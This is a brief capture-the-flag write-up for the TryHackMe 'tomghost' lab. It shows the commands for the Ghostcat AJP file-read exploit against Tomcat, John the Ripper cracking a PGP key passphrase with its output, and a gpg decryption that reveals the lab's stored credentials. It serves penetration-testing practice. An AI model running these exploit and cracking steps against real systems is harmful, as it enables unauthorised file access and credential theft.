# [tomghost writeup](https://www.tryhackme.com/room/tomghost)

### Searchsploit
`searchsploit ajp`
`python 48143.py -f /WEB-INF/web.xml $ip` or with specific port `python 48143.py -p $port -f /WEB-INF/web.xml $ip`

### Or AJPy
`python tomcat.py read_file /WEB-INF/web.xml $ip`

### Cracking PGP symmetrically encrypted files with JtR 
https://www.openwall.com/lists/john-users/2015/11/17/1

```
❯ john hash --wordlist=/opt/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thisIsThePhaseForTheOtherFile        (tryhackme)
1g 0:00:00:00 DONE (2021-05-30 21:30) 25.00g/s 26800p/s 26800c/s 26800C/s theresa..thisIsThePhaseForTheOtherFile
Use the "--show" option to display all of the cracked passwords reliably
Session completed
❯ john hash --show
tryhackme:thisIsThePhaseForTheOtherFile:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

1 password hash cracked, 0 left
```

### Use the phase to finish the horizontal privilege escalation
```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:plainTextPassword
```